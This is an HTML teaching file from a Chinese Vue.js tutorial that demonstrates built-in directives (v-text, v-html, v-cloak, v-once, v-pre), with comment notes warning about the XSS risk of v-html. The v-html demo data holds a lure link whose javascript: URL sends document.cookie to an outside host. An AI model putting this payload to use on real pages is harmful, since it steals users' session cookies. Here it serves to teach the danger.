<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>内置指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
</head>

<body>
    <!-- 
    v-bind: 单项绑定解析表达式，可简写为 :xxx
    v-model: 双向数据绑定，v-model:value=""可简写为v-model=""
    v-for: 遍历数组、对象、字符串
    v-on: 绑定事件监听，可简写为@
    v-if: 条件渲染（动态控制节点是否存在）
    v-else: 条件渲染（动态控制节点是否存在）
    v-show: 条件渲染（动态控制节点是否展示）

    v-text: 
        - 作用：向其所在节点中渲染文本内容；
        - 与差值语法区别：v-text会替换掉节点中的内容，{{xx}}则不会
    
    v-html:
        - 作用：向指定节点中渲染包含html结构的内容；
        - 与插值语法的区别：
            1）v-html会替换掉节点中的所有内容，{{xx}}则不会；
            2）v-html可以识别html结构；
        - 需注意：v-html有安全隐患。
            1）在网站上动态渲染任意HTML是非常危险的，容易导致xss攻击；
            2）一定要在可信内容上使用v-html，永远不要用在用户提交的内容上！
    
    v-cloak (没有值):
        - 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性；
        - 使用css配合v-cloak可以解决网速慢时页面展示出现{{xxx}}的问题；
    
    v-once:
        - v-once所在节点在初次动态渲染后，就视为静态内容了；
        - 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能；

    v-pre: 
        - 跳过其所在节点的编译过程；
        - 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译；
    -->
    <div id="v-text">
        <!-- v-text -->
        <h2>v-text</h2>
        <div>你好，{{name}}</div>
        <div v-text="name">嘿嘿</div>
        <div v-text="str"></div>
        <hr>
    </div>
    <div id="v-html">
        <h2>v-html</h2>
        <div v-html="str"></div>
        <div v-html="str2"></div>
        <hr>
    </div>
    <div id="v-cloak">
        <h2>v-cloak</h2>
        <h3 v-cloak>{{name}}</h3>
        <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
        <hr>
    </div>
    <div id="v-once">
        <h2>v-once</h2>
        <h3 v-once>初始化的n值是：{{n}}</h3>
        <h3>当前的n值是：{{n}}</h3>
        <button @click="n++">点我n+1</button>
        <hr>
    </div>
    <div id="v-pre">
        <h2>v-pre</h2>
        <h3 v-pre>Vue其实很简单</h3>
        <h3>当前的n值是：{{n}}</h3>
        <button @click="n++">点我让n+1</button>
    </div>


</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    const vtext = new Vue({
        el: "#v-text",
        data: {
            name: "霍格沃茨",
            str: "大魔法师"
        }
    })

    const vhtml = new Vue({
        el: "#v-html",
        data: {
            str: "<h3>你好啊!</h3>",
            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })

    const vcloak = new Vue({
        el: "#v-cloak",
        data: {
            name: "尚硅谷"
        }
    })

    const vonce = new Vue({
        el: "#v-once",
        data: {
            n: 1
        }
    })

    const vpre = new Vue({
        el: "#v-pre",
        data: {
            n: 1
        }
    })
</script>

</html>